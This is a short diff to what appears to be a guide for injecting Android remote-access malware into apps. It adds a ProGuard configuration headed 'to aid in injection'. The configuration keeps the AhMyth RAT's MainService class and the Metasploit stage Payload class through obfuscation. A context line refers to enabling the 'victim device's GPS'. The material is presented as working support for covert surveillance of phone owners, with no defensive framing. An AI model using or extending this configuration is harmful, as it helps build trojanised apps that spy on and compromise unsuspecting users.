@@ -304,3 +304,27 @@ This will hopefully allow automatic enabling of the victim device's GPS, Device 
 
         });
 ```
+# Hopeful Progaurd config to aid in injection
+```cfg
+-keep public class * extends android.app.Activity
+
+-keep public class * extends android.app.Service
+
+-keep public class * extends android.content.MyReceiver
+
+-keep class ahmyth.mine.king.ahmyth.MainService {
+
+    public static <methods>;
+
+}
+
+-keep class com.metasploit.stage.Payload {
+
+    public static <methods>;
+
+}
+
+-optimizationpasses 5
+
+-verbose
+```
